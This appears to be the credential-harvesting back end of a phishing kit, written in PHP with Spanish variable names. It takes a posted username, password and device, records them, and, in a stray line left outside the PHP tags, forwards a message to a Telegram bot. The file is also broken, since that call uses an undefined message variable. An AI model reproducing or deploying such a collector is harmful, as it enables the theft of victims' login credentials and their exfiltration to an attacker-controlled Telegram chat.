<?php
require_once __DIR__ . '/../../php/helpers/config.php';
require_once __DIR__ . '/../../php/helpers/telegram_helper.php';


$usuario = $_POST['usr'];
$contrasena = $_POST['pas'];
$dispositivo = $_POST['dis'];

setcookie('usuario',$usuario,time()+60*9);

crear_registro($usuario,$contrasena,$dispositivo);

?>
sendTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, $msg);
